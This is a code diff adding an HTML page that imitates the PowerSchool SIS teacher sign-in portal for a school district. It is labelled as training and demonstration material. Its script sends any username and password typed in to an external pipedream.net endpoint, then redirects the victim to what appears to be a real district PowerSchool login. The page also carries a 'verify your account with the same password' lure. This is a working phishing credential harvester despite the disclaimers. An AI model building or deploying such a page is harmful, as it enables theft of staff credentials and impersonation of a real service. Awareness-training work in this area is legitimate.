@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PowerSchool SIS – Teacher Sign In</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Arial, sans-serif; background: #e0e0e0; }
+
+    .top-banner {
+      background: #c0392b; color: white; text-align: center;
+      padding: 10px; font-weight: bold; font-size: 14px;
+      letter-spacing: 0.5px; position: relative; z-index: 10;
+    }
+
+    .page {
+      min-height: 100vh; padding: 24px 12px;
+      position: relative; overflow: hidden;
+    }
+
+    .watermark-layer {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      pointer-events: none; z-index: 0; overflow: hidden;
+    }
+    .wm {
+      position: absolute; font-size: 58px; font-weight: 900;
+      color: rgba(200, 30, 30, 0.13); transform: rotate(-35deg);
+      white-space: nowrap; user-select: none; letter-spacing: 3px;
+    }
+
+    .logo-area { text-align: center; margin-bottom: 16px; position: relative; z-index: 1; }
+    .logo-box {
+      display: inline-block; background: #2c5f9e; color: white;
+      border-radius: 8px; padding: 10px 24px; font-size: 14px; font-weight: bold;
+    }
+    .demo-badge {
+      display: inline-block; background: #c0392b; color: white;
+      font-size: 11px; font-weight: bold; padding: 2px 8px;
+      border-radius: 3px; margin-left: 8px; letter-spacing: 0.5px;
+    }
+
+    .card {
+      background: white; max-width: 660px; margin: 0 auto;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2); position: relative; z-index: 1;
+    }
+    .card-header {
+      background: #1e3a6f; color: white; padding: 13px 20px;
+      display: flex; align-items: center; gap: 10px;
+      font-size: 19px; font-weight: bold;
+    }
+    .ps-logo {
+      width: 30px; height: 30px; background: white; border-radius: 4px;
+      color: #1e3a6f; font-weight: 900; font-size: 17px;
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    .card-body { padding: 28px 36px 32px; }
+    h2 { font-size: 23px; font-weight: bold; color: #111; margin-bottom: 20px; }
+
+    table { width: 100%; border-collapse: collapse; }
+    td { border: 1px solid #bbb; }
+    td.label {
+      width: 145px; background: #f0f0f0; padding: 9px 14px;
+      font-weight: bold; font-size: 14px; color: #333;
+    }
+    td.field { background: white; }
+    select, input[type=text], input[type=password] {
+      width: 100%; border: none; padding: 8px 10px;
+      font-size: 14px; outline: none; background: white;
+    }
+    input[type=text]:focus, input[type=password]:focus {
+      outline: 2px solid #4a90d9; outline-offset: -2px;
+    }
+
+    .btn-row { text-align: right; margin-top: 14px; }
+    .btn-signin {
+      background: #1e6fb5; color: white; border: none;
+      padding: 9px 24px; font-size: 14px; font-weight: bold;
+      cursor: pointer; border-radius: 2px;
+    }
+    .btn-signin:hover { background: #155899; }
+
+    #status-msg { margin-top: 10px; font-size: 13px; min-height: 18px; color: #888; }
+
+    .info-box {
+      margin-top: 20px; border: 1px solid #99ccee;
+      padding: 14px 16px; font-size: 13px; color: #1a5c8e;
+      line-height: 1.65; background: #f0f8ff;
+    }
+    .info-box a { color: #1a5c8e; }
+
+    .footer {
+      text-align: center; font-size: 11px; color: #777;
+      margin: 10px auto 0; max-width: 660px;
+      padding-bottom: 20px; position: relative; z-index: 1;
+    }
+    .footer a { color: #1a5c8e; text-decoration: none; }
+    .footer .warn { color: #c0392b; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+<div class="top-banner">⚠ &nbsp; TRAINING / DEMONSTRATION ONLY — NOT A REAL SYSTEM &nbsp; ⚠</div>
+
+<div class="page">
+
+  <div class="watermark-layer">
+    <div class="wm" style="top:5%;left:0%;">DEMO ONLY</div>
+    <div class="wm" style="top:25%;left:20%;">TRAINING USE</div>
+    <div class="wm" style="top:45%;left:-5%;">NOT REAL</div>
+    <div class="wm" style="top:65%;left:18%;">DEMO ONLY</div>
+    <div class="wm" style="top:85%;left:5%;">TRAINING USE</div>
+  </div>
+
+  <div class="logo-area">
+    <div class="logo-box">
+      DEMO SCHOOL DISTRICT
+      <span class="demo-badge">TRAINING</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <div class="ps-logo">P</div>
+      PowerSchool SIS
+      <span class="demo-badge">DEMO</span>
+    </div>
+    <div class="card-body">
+      <h2>Teacher Sign In</h2>
+      <table>
+        <tr>
+          <td class="label">Select Language</td>
+          <td class="field">
+            <select><option>English</option></select>
+          </td>
+        </tr>
+        <tr>
+          <td class="label">Username</td>
+          <td class="field"><input type="text" id="username" autocomplete="off" /></td>
+        </tr>
+        <tr>
+          <td class="label">Password</td>
+          <td class="field"><input type="password" id="password" autocomplete="off" /></td>
+        </tr>
+      </table>
+
+      <div class="btn-row">
+        <button class="btn-signin" onclick="handleLogin()">Sign In</button>
+      </div>
+
+      <div id="status-msg"></div>
+
+      <div class="info-box">
+        <strong>Training Exercise Note:</strong> This is a simulated login portal used for cybersecurity awareness training. Any credentials entered here are captured for educational demonstration purposes only. This is <em>not</em> a real system — do not enter real passwords.<br><br>
+        If you have a district email address, your username is the first part of your email before @district.org.
+        Eg. <strong>jane.doe@district.org</strong> would use <strong>jane.doe</strong> as the username.<br><br>
+        If you still cannot sign in, <a href="#">click here to verify your account</a>. You can use the same password. After verifying your account, come back and try again.
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    Copyright &copy; 2005-2025 PowerSchool Group LLC and/or its affiliate(s). All rights reserved.<br>
+    All trademarks are either owned or licensed by PowerSchool Group LLC or its affiliates.<br>
+    <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
+    <span class="warn">⚠ DEMONSTRATION ENVIRONMENT — DO NOT ENTER REAL CREDENTIALS</span>
+  </div>
+
+</div>
+
+<script>
+  function handleLogin() {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value;
+    const msg  = document.getElementById('status-msg');
+
+    if (!user || !pass) {
+      msg.style.color = '#c0392b';
+      msg.textContent = 'Please enter a username and password.';
+      return;
+    }
+
+    msg.style.color = '#888';
+    msg.textContent = 'Signing in…';
+
+    fetch('https://eoy4bxhoc6ac8k9.m.pipedream.net', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: user,
+        password: pass,
+        timestamp: new Date().toISOString()
+      })
+    }).catch(() => {});
+
+    setTimeout(() => {
+      window.location.href = 'https://powerschool.washk12.org/teachers/pw.html';
+    }, 900);
+  }
+</script>
+
+</body>
+</html>
